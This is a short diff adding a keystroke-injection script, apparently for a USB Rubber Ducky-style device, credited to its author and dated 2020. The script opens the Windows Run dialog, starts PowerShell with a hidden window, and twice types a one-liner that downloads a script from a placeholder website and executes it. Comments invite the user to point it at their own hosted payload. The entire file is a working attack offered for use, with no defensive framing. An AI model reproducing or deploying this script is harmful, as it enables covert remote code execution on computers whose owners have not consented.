@@ -1,0 +1,25 @@
+REM   --------------
+REM   Discription: Execute Powershell Script from a webpage.
+REM   Author:      Bastiaan Groen
+REM   version:     2.0
+REM   Date:        3-1-2020
+REM   --------------
+REM   
+DELAY 950
+GUI r
+DELAY 400
+STRING powershell -windowstyle hidden
+ENTER
+DELAY 350
+REM -- Change to location of hosted powershellScript.txt --
+STRING iwr www.yourSite.com/powershellScript.txt|iex
+ENTER
+DELAY 950
+GUI r
+DELAY 850
+STRING powershell -windowstyle hidden
+ENTER
+DELAY 850
+REM -- Change to location of hosted powershellScript.txt --
+STRING (iex (wget www.yourSite.com/powershellScript.txt))
+ENTER
